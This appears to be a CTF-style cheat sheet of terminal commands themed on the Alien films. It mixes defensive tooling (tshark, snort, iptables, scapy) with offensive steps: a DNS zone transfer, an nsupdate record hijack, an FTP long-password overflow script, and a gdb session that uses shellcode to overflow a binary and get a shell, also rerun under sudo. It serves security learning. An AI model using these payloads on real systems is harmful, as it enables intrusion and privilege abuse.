# Various Terminal commands

### How do you find and follow a tcp stream with tshark?
```
tshark -r snort.log.pcap -Y "http.user_agent contains Xenomorph" -T fields -e tcp.stream
tshark -r snort.log.pcap -z follow,tcp,ascii,5
```

### What is an example snort rule to alert on traffic with certain content or user_agent?
```
alert tcp $HOME_NET any -> $EXTERNAL_NET any (msg:'YO WTF'; content:'Xenomorph'; sid:1000001; rev:1;classtype:trojan-activity)
```
`pcre` can be used instead of `content` to perform a regular expression filter

### What is scalpel?
It's a way to use extract files from an image binary if you know the headers and footers of the file you're looking for. It works best if you use the real hex values that you're trying to find.

### How do you use dig to perform a domain transfer?
Check `/etc/bind/` for any information on what IP addresses are allowed to modify domains.
```
dig @127.0.0.1 norehca.planet axfr -b 127.34.243.1
```

### How do you use nsupdate to modify subdomain information?
Check `/etc/bind/` for any information on what IP addresses are allowed to modify domains.
```
$ nsupdate
> server 127.0.0.1
> local 127.34.0.1
> update delete  hive.norehca.planet. A
> update add hive.norehca.planet. 600 A 127.0.0.1
> send
```

### Dump of various iptables commands:
```
1. Set the default policies to DROP for 
   the INPUT,FORWARD and OUTPUT chains.

sudo iptables -P INPUT DROP
sudo iptables -P FORWARD DROP
sudo iptables -P OUTPUT DROP

2. Create a rule to LOG all new SSH 
   connection attempts.
   
sudo iptables -I OUTPUT -p tcp -m tcp --dport 22 -m state --state NEW,ESTABLISHED -j LOG --log-prefix "Outgoing SSH connection"
sudo iptables -I INPUT -p tcp -m tcp --dport 22 -m state --state NEW,ESTABLISHED -j LOG --log-prefix "Outgoing SSH connection"

3. Create a rule to ACCEPT all connections 
   that are ESTABLISHED,RELATED on the INPUT
   and the OUTPUT chains.

sudo iptables -A INPUT -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT
sudo iptables -A OUTPUT -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT

4. Create a rule to allow only remote source 
   ip address 172.18.0.222 to access the local
   SSH server on (port 22).

sudo iptables -A INPUT -p tcp -s 172.18.0.222 --dport 22 -j ACCEPT

5. Create a rule to allow any remote ip to 
   access local tcp servers on ports 25 and 80.

sudo iptables -A INPUT -p tcp --dport 25 -j ACCEPT
sudo iptables -A INPUT -p tcp --dport 80 -j ACCEP

6. Create a rule applied to the INPUT chain
   to ACCEPT all traffic from the lo interface.

sudo iptables -A INPUT -i lo -j ACCEPT

7. Create a rule to allow UDP port 53 and TCP 
   port 80 connections going out (OUTPUT).

sudo iptables -A OUTPUT -p udp --dport 53 -j ACCEPT
sudo iptables -A OUTPUT -p tcp --dport 80 -j ACCEPT
```

### How do you save and use cookies with cURL?
```
curl localhost/cache --cookie-jar cookie.txt
curl localhost/upload --cookie cookie.txt
```

### How do you get and delete files from an FTP server with cURL?
```
curl -u ftpuser:ftppass ftp://127.0.0.1/filename1 -O filename1
curl ftp://ftpuser:ftppass@localhost -Q "DELE xenomorph1"
```

### How do you analyze a pcap file with an SSL keylog file?
```
tshark -r <capture_file>  -Y <wireshark_filter>  -o ssl.keylog_file:client_random.log
```

### How can you use scapy to realign the ports for server and client so that tshark can analyze the file?
```
#!/usr/bin/python
from scapy.all import *

packets = rdpcap('covert_channel.pcap')
for packet in packets:
  if packet[IP].src == '10.124.245.32':
    packet[TCP].sport = 443
    packet[TCP].dport = 59292
  else:
    packet[TCP].sport = 59292
    packet[TCP].dport = 443

wrpcap('fixed_ports.pcap', packets)
```

### Give an example of using gdb and using a payload from shell-storm to pop a shell by overwriting EIP and directing code to run the payload:
```
weyuser@14c7b2eb3e7f:~$ gdb xeno_scanner.elf 
GNU gdb (Ubuntu 7.11.1-0ubuntu1~16.5) 7.11.1
Copyright (C) 2016 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "i686-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from xeno_scanner.elf...(no debugging symbols found)...done.
(gdb) r $(printf "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80ABCDEFGHIJKLMNOPQRST\x90\xd6\xff\xffAAAAA")
Starting program: /home/weyuser/xeno_scanner.elf $(printf "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80ABCDEFGHIJKLMNOPQRST\x90\xd6\xff\xffAAAAA")
Xenomorph Scanner. Testing DNA of user with specified $UID...
Storing your DNA at: 0xffffd690
User with UID " 1�Ph//shh/bin��PS��
                                   ̀ABCDEFGHIJKLMNOPQRST����AAAAA" is NOT infected with Xeno-DNA.
Program received signal SIGSEGV, Segmentation fault.
0xffffd690 in ?? ()
(gdb) info registers
eax            0x0      0
ecx            0x7fffffbb       2147483579
edx            0xf7fcd870       -134424464
ebx            0xffffd6f0       -10512
esp            0xffffd6c0       0xffffd6c0
ebp            0x54535251       0x54535251
esi            0xf7fcc000       -134430720
edi            0xf7fcc000       -134430720
eip            0xffffd690       0xffffd690
eflags         0x10286  [ PF SF IF RF ]
cs             0x23     35
ss             0x2b     43
ds             0x2b     43
es             0x2b     43
fs             0x0      0
gs             0x63     99
(gdb) r $(printf "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80ABCDEFGHIJKLMNOPQRST\x91\xd6\xff\xffAAAAA")
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/weyuser/xeno_scanner.elf $(printf "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80ABCDEFGHIJKLMNOPQRST\x91\xd6\xff\xffAAAAA")
Xenomorph Scanner. Testing DNA of user with specified $UID...
Storing your DNA at: 0xffffd690
User with UID " 1�Ph//shh/bin��PS��
                                   ̀ABCDEFGHIJKLMNOPQRST����AAAAA" IS infected with xeno-DNA. Please report to the medical bay for immediate extraction
process 35 is executing new program: /bin/dash
$ ls
HELP  xeno_scanner.c  xeno_scanner.elf
$ whoami
weyuser
```

### After finding the correct payload, how can you execute a file with the payload?
```
weyuser@8914c8642587:~$ sudo ./xeno_scanner.elf $(printf "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80AAAAAAAAAAAAAAAAAAAA\xb1\xd6\xff\xffAAAAAAAA")
```

### Give an example jq query to filter entries based on a field matching an array of names:
```
jq '.[]| select(.name.first | contains("Ellen","Ash","Dallas","Lambert","Brett","Kane","Parker")) ' crew.json
```

### Give an example jq query to combine fields and print them in CSV format:
```
jq -cr '.[]| select(.name.first | contains("Ellen","Ash","Dallas","Lambert","Brett","Kane","Parker")) | [.latitude,.longitude] | @csv' crew.json
```

### Give an example of a scripted FTP command:
```
#!/bin/bash
HOST='127.0.0.1'
USER='root'
PASSWD=$(python -c "print('pass'+10000*'A')")
ftp -n -v $HOST << EOT
user $USER $PASSWD
ls
EOT
```

### What command helps to find non-standard open ports?
```
nmap -sV --open -p10-4000 mine.wey-tech.com
```
